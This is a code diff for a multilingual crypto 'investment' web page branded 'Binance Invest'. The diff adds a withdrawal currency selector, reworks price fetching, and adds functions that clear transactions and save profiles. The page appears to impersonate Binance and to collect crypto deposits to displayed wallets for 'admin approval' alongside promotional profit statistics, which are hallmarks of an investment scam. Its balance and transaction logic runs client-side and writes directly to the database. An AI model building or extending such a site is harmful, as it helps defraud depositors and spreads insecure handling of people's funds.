@@ -112,7 +112,7 @@ header{height:72px;position:sticky;top:0;z-index:50;background:#05070be8;backdro
 <button data-page="profile" onclick="page('profile',this)" data-t="profile">Profile</button>
 </nav>
 
-<section id="home" class="view active">
+<section id="home" class="view">
 <div class="hero"><div class="eyebrow" data-t="eyebrowText">PREMIUM DIGITAL ASSET PLATFORM</div><h1 data-t="hero">Build your future with intelligent investing.</h1><p data-t="heroDesc">Explore digital assets, investment plans and portfolio tools in one premium interface.</p><div class="actions"><button class="btn gold" onclick="page('invest')" data-t="exploreInvest">Explore Investments</button><button class="btn" onclick="page('markets')" data-t="exploreMarkets">Explore Markets</button></div><div class="orb"></div></div>
 
 <div class="title"><h2 data-t="top">Top Markets</h2><button class="btn" onclick="page('markets')" data-t="viewAll">View all</button></div><div class="coins" id="topCoins"></div>
@@ -235,10 +235,10 @@ header{height:72px;position:sticky;top:0;z-index:50;background:#05070be8;backdro
       <div id="crypto-options-container" style="margin-bottom: 15px;">
           <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;" data-t="depCryptoLabel">Select Currency & Network:</label>
           <select id="crypto-currency" onchange="togglePaymentDetails()" style="width:100%; padding:11px; background:#1a222c; border:1px solid #474d57; color:#fff; border-radius:8px;">
-              <option value="trx_usdt_trc20">TRX / Tether (TRC20)</option>
-              <option value="bnb_usdt_bep20">BNB / Tether (BEP20)</option>
-              <option value="eth_usdt_erc20">Ethereum / Tether (ERC20)</option>
-              <option value="btc">Bitcoin (BTC)</option>
+              <option value="trx_usdt_trc20">🪙 TRX / Tether (TRC20)</option>
+              <option value="bnb_usdt_bep20">🟡 BNB / Tether (BEP20)</option>
+              <option value="eth_usdt_erc20">🔷 Ethereum / Tether (ERC20)</option>
+              <option value="btc">₿ Bitcoin (BTC)</option>
           </select>
       </div>
 
@@ -252,13 +252,31 @@ header{height:72px;position:sticky;top:0;z-index:50;background:#05070be8;backdro
       <button class="btn gold" style="width:100%; padding: 12px; font-size: 15px;" onclick="submitDepositRequest()" data-t="depSubmitBtn">Submit Deposit Request</button>
     </div>
 
-    <div class="card" style="padding: 25px;">
+    <!-- بخش برداشت با سه کادر درخواستی (نوع ارز با لوگو، آدرس ولت، مبلغ) -->
+    <div class="card form" style="padding: 25px;">
       <h2 data-t="withdraw" style="font-size: 20px; margin-bottom: 8px;">Withdraw</h2>
       <p class="muted" data-t="withdrawDesc" style="margin-bottom: 20px;">Request withdrawal instantly.</p>
       
-      <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;" data-t="withdrawWalletLabel">Destination Wallet Address / Network:</label>
-      <input id="withdrawAddress" type="text" placeholder="e.g. TRC20 / BEP20 Wallet Address" style="width:100%; padding:11px; background:#1a222c; border:1px solid #474d57; color:#fff; border-radius:8px; margin-bottom:15px;">
+      <!-- کادر اول: انتخاب نوع ارز و شبکه با لوگو -->
+      <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;" data-t="withdrawCryptoLabel">Select Currency & Network:</label>
+      <select id="withdrawCrypto" style="width:100%; padding:11px; background:#1a222c; border:1px solid #474d57; color:#fff; border-radius:8px; margin-bottom:15px;">
+          <option value="USDT (TRC20)">🪙 USDT (TRC20)</option>
+          <option value="USDT (BEP20)">💎 USDT (BEP20)</option>
+          <option value="USDT (ERC20)">🔷 USDT (ERC20)</option>
+          <option value="Bitcoin (BTC)">₿ Bitcoin (BTC)</option>
+          <option value="Ethereum (ETH)">Ξ Ethereum (ETH)</option>
+          <option value="BNB (BEP20)">🟡 BNB (Smart Chain)</option>
+          <option value="TRON (TRX)">🔴 TRON (TRX)</option>
+          <option value="Solana (SOL)">🟣 Solana (SOL)</option>
+          <option value="Litecoin (LTC)">Ł Litecoin (LTC)</option>
+          <option value="Dogecoin (DOGE)">Ð Dogecoin (DOGE)</option>
+      </select>
 
+      <!-- کادر دوم: آدرس ولت -->
+      <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;" data-t="withdrawWalletLabel">Destination Wallet Address:</label>
+      <input id="withdrawAddress" type="text" placeholder="e.g. TDeaeRTD4Ebj8FDhe4fZK3mGBNWnWajyzG" style="width:100%; padding:11px; background:#1a222c; border:1px solid #474d57; color:#fff; border-radius:8px; margin-bottom:15px;">
+
+      <!-- کادر سوم: مبلغ برداشت -->
       <label style="display:block; color:#aeb7c3; font-size:12px; margin-bottom:5px;" data-t="withdrawAmountLabel">Amount (USD):</label>
       <input id="withdrawAmount" type="number" placeholder="50" style="width:100%; padding:11px; background:#1a222c; border:1px solid #474d57; color:#fff; border-radius:8px; margin-bottom:15px;">
       
@@ -327,10 +345,10 @@ forgotPasswordText:"Forgot Password?",needAccountText:"Don't have an account? Si
 contactUs:"Contact Us", supportEmail:"Support Email", securityPartners:"Security Partners & Protection",
 platformStatsTitle:"Platform Statistics", statUsers:"Platform Users", statInvestors:"Active Investors", statPaid:"Total Profit Paid", statCapital:"Platform Capital", liveWithdrawalsTitle:"Live Withdrawals", justNow:"Just now",
 depAmountLabel:"Amount (USD):", depMethodLabel:"Select Payment Method:", depCryptoLabel:"Select Currency & Network:", depTxLabel:"Transaction Hash / Reference Code:", depSubmitBtn:"Submit Deposit Request",
-optDirect:"1. Direct Payment", optPaymentio:"2. Payment via Payment.io / NowPayments Gateway",
+optDirect:"1. Direct Payment", optPaymentio:"2. Payment.io / NowPayments Gateway",
 walletMsg:"<b>Wallet Address for selected network:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Please transfer the amount to this address and submit the TXID for admin approval.</small>",
 paymentioMsg:"<b>Payment.io / NowPayments Gateway selected.</b> Please use the secure widget below to complete your payment.",
-withdrawWalletLabel:"Destination Wallet Address / Network:"
+withdrawWalletLabel:"Destination Wallet Address:", withdrawCryptoLabel:"Select Currency & Network:", withdrawAmountLabel:"Amount (USD):"
 },
 fa:{
 brand:"بایننس اینوست",login:"ورود",register:"ساخت حساب",logout:"خروج",overview:"نمای کلی",markets:"بازارها",invest:"سرمایه‌گذاری",portfolio:"سبد من",transactions:"تراکنش‌ها",rewards:"جوایز",profile:"پروفایل",
@@ -352,7 +370,7 @@ depAmountLabel:"مبلغ (دلار / USD):", depMethodLabel:"انتخاب روش
 optDirect:"۱. پرداخت مستقیم", optPaymentio:"2. پرداخت از طریق درگاه Payment.io / NowPayments",
 walletMsg:"<b>آدرس ولت برای این شبکه:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>لطفاً مبلغ را به این آدرس واریز کرده و سپس کد پیگیری/هش تراکنش را ثبت کنید تا پس از بررسی مدیر به موجودی شما اضافه گردد.</small>",
 paymentioMsg:"درگاه پرداخت <b>Payment.io / NowPayments</b> انتخاب شد. لطفاً از طریق ویجت امن زیر پرداخت خود را انجام دهید.",
-withdrawWalletLabel:"آدرس ولت مقصد (شبکه / آدرس):"
+withdrawWalletLabel:"آدرس ولت مقصد:", withdrawCryptoLabel:"انتخاب نوع ارز و شبکه برداشت:", withdrawAmountLabel:"مبلغ برداشت (دلار / USD):"
 },
 az:{
 brand:"Binance İnvest",login:"Daxil ol",register:"Hesab yarat",logout:"Çıxış",overview:"Ümumi",markets:"Bazarlar",invest:"İnvestisiya",portfolio:"Portfel",transactions:"Əməliyyatlar",rewards:"Mükafatlar",profil:"Profil",
@@ -374,7 +392,7 @@ depAmountLabel:"Məbləğ (USD):", depMethodLabel:"Ödəniş Üsulunu Seçin:", 
 optDirect:"1. Birbaşa Ödəniş", optPaymentio:"2. Payment.io / NowPayments Vasitəsilə Ödəniş",
 walletMsg:"<b>Seçilmiş şəbəkə üçün cüzdan ünvanı:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Zəhmət olmasa məbləği bu ünvana köçürün və təsdiq üçün TXID kodunu daxil edin.</small>",
 paymentioMsg:"<b>Payment.io / NowPayments</b> seçildi. Zəhmət olmasa aşağıdakı təhlükəsiz vidjetdən istifadə edin.",
-withdrawWalletLabel:"Təyinat Cüzdan Ünvanı / Şəbəkə:"
+withdrawWalletLabel:"Təyinat Cüzdan Ünvanı:", withdrawCryptoLabel:"Valyuta və Şəbəkəni Seçin:", withdrawAmountLabel:"Məbləğ (USD):"
 },
 tr:{
 brand:"Binance Invest",login:"Giriş Yap",register:"Hesap Oluştur",logout:"Çıkış Yap",overview:"Genel Bakış",markets:"Piyasalar",invest:"Yatırım",portfolio:"Portföy",transactions:"İşlemler",rewards:"Ödüller",profile:"Profil",
@@ -395,7 +413,7 @@ depAmountLabel:"Miktar (USD):", depMethodLabel:"Ödeme Yöntemi Seçin:", depCry
 optDirect:"1. Doğrudan Ödeme", optPaymentio:"2. Payment.io / NowPayments İle Ödeme",
 walletMsg:"<b>Seçilen ağ için cüzdan adresi:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Lütfen tutarı bu adrese gönderin ve onay için TXID kodunu girin.</small>",
 paymentioMsg:"<b>Payment.io / NowPayments</b> seçildi. Lütfen aşağıdaki güvenli widget'ı kullanın.",
-withdrawWalletLabel:"Hedef Cüzdan Adresi / Ağ:"
+withdrawWalletLabel:"Hedef Cüzdan Adresi:", withdrawCryptoLabel:"Para Birimi ve Ağ Seçin:", withdrawAmountLabel:"Miktar (USD):"
 },
 ru:{
 brand:"Binance Invest",login:"Войти",register:"Регистрация",logout:"Выйти",overview:"Обзор",markets:"Рынки",invest:"Инвестиции",portfolio:"Портфель",transactions:"Транзакции",rewards:"Награды",profile:"Профиль",
@@ -416,7 +434,7 @@ depAmountLabel:"Сумма (USD):", depMethodLabel:"Выберите спосо�
 optDirect:"1. Прямой платеж", optPaymentio:"2. Оплата через Payment.io / NowPayments",
 walletMsg:"<b>Адрес кошелька для выбранной сети:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Переведите сумму на этот адрес и введите TXID для подтверждения администратором.</small>",
 paymentioMsg:"<b>Выбран шлюз Payment.io / NowPayments.</b> Используйте безопасный виджет ниже для оплаты.",
-withdrawWalletLabel:"Адрес кошелька назначения / Сеть:"
+withdrawWalletLabel:"Адрес кошелька назначения:", withdrawCryptoLabel:"Выберите валюту и сеть:", withdrawAmountLabel:"Сумма (USD):"
 },
 ar:{
 brand:"بایننس إنفست",login:"تسجيل الدخول",register:"إنشاء حساب",logout:"تسجيل الخروج",overview:"نظرة عامة",markets:"الأسواق",invest:"استثمار",portfolio:"محفظتي",transactions:"المعاملات",rewards:"المكافآت",profile:"الملف الشخصي",
@@ -438,7 +456,7 @@ depAmountLabel:"المبلغ (دولار أمريكي):", depMethodLabel:"اخت
 optDirect:"1. الدفع المباشر", optPaymentio:"2. الدفع عبر بوابة Payment.io / NowPayments",
 walletMsg:"<b>عنوان المحفظة للشبكة المحددة:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>يرجى تحويل المبلغ إلى هذا العنوان وإرسال كود TXID لموافقة المشرف.</small>",
 paymentioMsg:"<b>تم اختيار بوابة Payment.io / NowPayments.</b> يرجى استخدام الأداة الآمنة أدناه لإتمام الدفع.",
-withdrawWalletLabel:"عنوان محفظة الوجهة / الشبكة:"
+withdrawWalletLabel:"عنوان محفظة الوجهة:", withdrawCryptoLabel:"اختر العملة والشبكة:", withdrawAmountLabel:"المبلغ (دولار):"
 },
 zh:{
 brand:"币安投资 (Binance Invest)",login:"登录",register:"注册账户",logout:"登出",overview:"概览",markets:"市场",invest:"投资",portfolio:"资产组合",transactions:"交易记录",rewards:"奖励",profile:"个人资料",
@@ -460,7 +478,7 @@ depAmountLabel:"金额 (美元):", depMethodLabel:"选择支付方式:", depCryp
 optDirect:"1. 直接支付", optPaymentio:"2. 通过 Payment.io / NowPayments 网关支付",
 walletMsg:"<b>所选网络的钱包地址：</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>请将金额转入此地址并提交 TXID 以供管理员批准。</small>",
 paymentioMsg:"<b>已选择 Payment.io / NowPayments 网关。</b> 请使用下方的安全小组件完成支付。",
-withdrawWalletLabel:"目标钱包地址 / 网络："
+withdrawWalletLabel:"目标钱包地址：", withdrawCryptoLabel:"选择币种与网络：", withdrawAmountLabel:"金额 (美元)："
 },
 es:{
 brand:"Binance Invest",login:"Iniciar sesión",register:"Crear cuenta",logout:"Cerrar sesión",overview:"Resumen",markets:"Mercados",invest:"Invertir",portfolio:"Portafolio",transactions:"Transacciones",rewards:"Recompensas",profile:"Perfil",
@@ -482,7 +500,7 @@ depAmountLabel:"Cantidad (USD):", depMethodLabel:"Seleccionar método de pago:",
 optDirect:"1. Pago directo", optPaymentio:"2. Pago mediante pasarela Payment.io / NowPayments",
 walletMsg:"<b>Dirección de billetera para la red seleccionada:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Transfiera el monto a esta dirección y envíe el TXID para aprobación del administrador.</small>",
 paymentioMsg:"<b>Pasarela Payment.io / NowPayments seleccionada.</b> Utilice el widget seguro a continuación para pagar.",
-withdrawWalletLabel:"Dirección de billetera de destino / Red:"
+withdrawWalletLabel:"Dirección de billetera de destino:", withdrawCryptoLabel:"Seleccionar moneda y red:", withdrawAmountLabel:"Cantidad (USD):"
 },
 fr:{
 brand:"Binance Invest",login:"Se connecter",register:"Créer un compte",logout:"Se déconnecter",overview:"Aperçu",markets:"Marchés",invest:"Investir",portfolio:"Portefeuille",transactions:"Transactions",rewards:"Récompenses",profile:"Profil",
@@ -504,7 +522,7 @@ depAmountLabel:"Montant (USD) :", depMethodLabel:"Sélectionner le mode de paiem
 optDirect:"1. Paiement direct", optPaymentio:"2. Paiement via Payment.io / NowPayments",
 walletMsg:"<b>Adresse du portefeuille pour le réseau sélectionné :</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Veuillez transférer le montant à cette adresse et soumettre le TXID.</small>",
 paymentioMsg:"<b>Passerelle Payment.io / NowPayments sélectionnée.</b> Veuillez utiliser le widget sécurisé ci-dessous.",
-withdrawWalletLabel:"Adresse du portefeuille de destination / Réseau :"
+withdrawWalletLabel:"Adresse du portefeuille de destination :", withdrawCryptoLabel:"Sélectionner la devise et le réseau :", withdrawAmountLabel:"Montant (USD) :"
 },
 de:{
 brand:"Binance Invest",login:"Anmelden",register:"Konto erstellen",logout:"Abmelden",overview:"Übersicht",markets:"Märkte",invest:"Investieren",portfolio:"Portfolio",transactions:"Transaktionen",rewards:"Belohnungen",profile:"Profil",
@@ -526,7 +544,7 @@ depAmountLabel:"Betrag (USD):", depMethodLabel:"Zahlungsmethode auswählen:", de
 optDirect:"1. Direkte Zahlung", optPaymentio:"2. Zahlung über Payment.io / NowPayments Gateway",
 walletMsg:"<b>Wallet-Adresse für das ausgewählte Netzwerk:</b><br><span style='color:#0ecb81; user-select: all;'>{ADDR}</span><br><small style='color:#aaa;'>Bitte überweisen Sie den Betrag an diese Adresse und senden Sie die TXID zur Genehmigung durch den Administrator.</small>",
 paymentioMsg:"<b>Payment.io / NowPayments Gateway ausgewählt.</b> Bitte nutzen Sie das sichere Widget unten.",
-withdrawWalletLabel:"Ziel-Wallet-Adresse / Netzwerk:"
+withdrawWalletLabel:"Ziel-Wallet-Adresse:", withdrawCryptoLabel:"Währung & Netzwerk auswählen:", withdrawAmountLabel:"Betrag (USD):"
 }
 };
 
@@ -721,7 +739,6 @@ async function submitAuth(){
     if(u.length<3) return toast("Username must be at least 3 characters");
     if(!email.includes("@")) return toast("Please enter a valid email address");
     
-    // Password validation: minimum 8 characters, containing lowercase, uppercase, and numbers
     const pwdRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;
     if(!pwdRegex.test(p)){
       return toast("Password must be at least 8 chars with uppercase, lowercase, and numbers.");
@@ -815,14 +832,15 @@ async function saveTx(type, amount, status){
 async function withdraw(){
   let a = +document.getElementById("withdrawAmount").value;
   let address = document.getElementById("withdrawAddress").value.trim();
+  let crypto = document.getElementById("withdrawCrypto").value;
   
   if(!currentUser) return openAuth("login");
   if(!address) return toast("Please enter your destination wallet address");
-  if(a <= 0 || a > currentUser.balance) return toast("Insufficient balance or invalid amount");
+  if(!a || a <= 0 || a > currentUser.balance) return toast("Insufficient balance or invalid amount");
   
   currentUser.balance -= a;
   await saveUserData();
-  await saveTx('Withdrawal to ' + address, a, 'Pending');
+  await saveTx('Withdrawal (' + crypto + ') to ' + address, a, 'Pending');
   updatePortfolio(); loadTransactions(); 
   toast("Withdrawal requested successfully!");
   
@@ -946,61 +964,89 @@ function calcCustom(){
 function fmt(n){ return n>=1e12?(n/1e12).toFixed(2)+"T":n>=1e9?(n/1e9).toFixed(2)+"B":n>=1e6?(n/1e6).toFixed(2)+"M":Number(n).toLocaleString(); }
 function row(c){ let d = live[c[2]]||demo[c[2]], on = stars.includes(c[0]); return `<tr><td><button class="star ${on?"on":""}" onclick="toggleStar('${c[0]}')">★</button></td><td><b>${c[0]}</b> <span class="muted">${c[1]}</span></td><td>$${Number(d[0]).toLocaleString(undefined,{maximumFractionDigits:4})}</td><td class="${d[1]>=0?"green":"red"}">${d[1]>=0?"+":""}${d[1].toFixed(2)}%</td><td>$${fmt(d[2])}</td><td>$${fmt(d[3])}</td></tr>`; }
 function renderTable(){ let q = (search.value||"").toLowerCase(); marketTable.innerHTML = coins.filter(c=>(c[0]+" "+c[1]).toLowerCase().includes(q)).map(row).join(""); }
-function renderTop(){ topCoins.innerHTML = coins.slice(0,8).map(c=>{ let d = live[c[2]]||demo[c[2]]; return `<div class="card"><div class="coinTop"><div class="coin"><div class="icon">${c[3]}</div><div><b>${c[0]}</b><div class="muted">${c[1]}</div></div></div><span class="${d[1]>=0?"green":"red"}">${d[1].toFixed(2)}%</span></div><div class="price">$${Number(d[0]).toLocaleString(undefined,{maximumFractionDigits:4})}</div><div class="muted">${fmt(d[2])} market cap</div></div>`; }).join(""); }
-function toggleStar(s){ stars = stars.includes(s) ? stars.filter(x=>x!==s) : [...stars,s]; localStorage.setItem("bi_stars",JSON.stringify(stars)); renderTable(); renderTop(); }
+function renderTop(){ topCoins.innerHTML = coins.slice(0,8).map(c=>{ let d = live[c[2]]||demo[c[2]]; return `<div class="card"><div class="coinTop"><div class="coin"><div class="icon">${c[3]}</div><div><b>${c[0]}</b><div class="muted">${c[1]}</div></div></div><span class="${d[1]>=0?"green":"red"}">${d[1].toFixed(2)}%</span></div><div class="price">$${Number(d[0]).toLocaleString(undefined,{maximumFractionDigits:4})}</div></div>`; }).join(""); }
 
-async function prices(){
+async function loadMarket(){
   try{
-    let r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids="+coins.map(c=>c[2]).join(",")+"&vs_currencies=usd&include_24hr_change=true&include_market_cap=true&include_24hr_vol=true");
-    if(r.ok){ let d = await r.json(); coins.forEach(c=>{ let x = d[c[2]]; if(x) live[c[2]] = [x.usd, x.usd_24h_change||0, x.usd_market_cap||0, x.usd_24h_vol||0]; }); }
-  }catch(e){}
+    let res = await fetch("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=12&page=1&sparkline=false");
+    let data = await res.json();
+    data.forEach(x => { live[x.id] = [x.current_price, x.price_change_percentage_24h_in_currency||x.price_change_percentage_24h||0, x.market_cap, x.total_volume]; });
+  }catch(e){console.log(e);}
   renderTop(); renderTable();
 }
 
+function toggleStar(s){
+  if(stars.includes(s)) stars = stars.filter(x=>x!==s); else stars.push(s);
+  localStorage.setItem("bi_stars", JSON.stringify(stars));
+  renderTable();
+}
+
 async function loadTransactions(){
-  if(!currentUser){ txList.innerHTML = '<p class="muted">Please sign in to view your transactions.</p>'; return; }
-  let { data: txs, error } = await supabaseClient.from('transactions').select('*').eq('username', currentUser.username).order('id', {ascending: false});
-  if(error || !txs){ txList.innerHTML = '<p class="muted">No transactions found.</p>'; return; }
-  
-  txList.innerHTML = `<div class="tablebox"><table class="table"><thead><tr><th>Type</th><th>Amount</th><th>Status</th><th>Date</th></tr></thead><tbody>` + 
-    txs.map(t => `<tr><td>${t.type}</td><td class="${t.type.includes('Deposit')?'green':'red'}">$${t.amount}</td><td>${t.status}</td><td>${t.date}</td></tr>`).join("") +
+  if(!currentUser) return;
+  let { data, error } = await supabaseClient.from('transactions').select('*').eq('username', currentUser.username).order('id', {ascending: false});
+  let list = document.getElementById("txList");
+  if(!list) return;
+  if(!data || data.length === 0){ list.innerHTML = `<p class="muted" style="padding:15px;">No transactions found.</p>`; return; }
+  list.innerHTML = `<div class="tablebox"><table class="table"><thead><tr><th>Date</th><th>Type</th><th>Amount</th><th>Status</th></tr></thead><tbody>` +
+    data.map(t=>`<tr><td>${t.date||''}</td><td><b>${t.type}</b></td><td class="green">+$${t.amount}</td><td><span style="color:${t.status==='Completed'||t.status==='Active'?'var(--green)':'var(--gold)'}">${t.status}</span></td></tr>`).join("") +
     `</tbody></table></div>`;
 }
 
-function clearTx(){
-  txList.innerHTML = '<p class="muted">No transactions.</p>';
+async function clearTx(){
+  if(!currentUser) return;
+  await supabaseClient.from('transactions').delete().eq('username', currentUser.username);
+  loadTransactions(); toast("History cleared");
+}
+
+function copyRef(){ navigator.clipboard.writeText("https://binanceinvest.com/?ref=" + (currentUser?currentUser.username:"BI")); toast("Referral link copied!"); }
+
+async function saveProfile(){
+  if(!currentUser) return openAuth("login");
+  currentUser.fullname = fullNameInput.value;
+  currentUser.phone = phone.value;
+  await saveUserData();
+  updateHeaderAuthUI();
+  toast("Profile saved successfully!");
+}
+
+function loadProfile(){
+  if(!currentUser) return;
+  username.value = currentUser.username;
+  emailInput.value = currentUser.email || "";
+  fullNameInput.value = currentUser.fullname || "";
+  phone.value = currentUser.phone || "";
 }
 
 function setLang(l){
   localStorage.setItem("bi_lang", l);
-  document.documentElement.lang = l;
-  document.documentElement.dir = (l === 'fa' || l === 'ar') ? 'rtl' : 'ltr';
-  let dict = T[l] || T.en;
-  document.querySelectorAll("[data-t]").forEach(el => {
+  let d = T[l] || T.en;
+  document.querySelectorAll("[data-t]").forEach(el=>{
     let k = el.getAttribute("data-t");
-    if(dict[k]) el.innerHTML = dict[k];
+    if(d[k]) el.textContent = d[k];
   });
   renderPlans();
 }
 
-window.onload = function(){
-  let savedLang = localStorage.getItem("bi_lang") || "en";
-  document.getElementById("lang").value = savedLang;
-  setLang(savedLang);
-  
+window.onload = async function(){
   let savedUser = localStorage.getItem("bi_current_user");
   if(savedUser){
     try {
       currentUser = JSON.parse(savedUser);
-      updateHeaderAuthUI();
-      updatePortfolio();
-    } catch(e){ localStorage.removeItem("bi_current_user"); }
+      let { data } = await supabaseClient.from('users').select('*').eq('username', currentUser.username).limit(1);
+      if(data && data.length > 0) currentUser = data[0];
+    } catch(e){ console.log(e); }
   }
   
-  prices();
-  setInterval(prices, 30000);
+  let savedLang = localStorage.getItem("bi_lang") || "en";
+  document.getElementById("lang").value = savedLang;
+  setLang(savedLang);
+  
+  updateHeaderAuthUI();
   renderPlans();
-}
+  loadMarket();
+  setInterval(loadMarket, 30000);
+  if(currentUser) { loadProfile(); updatePortfolio(); }
+};
 </script>
 </body>
 </html>
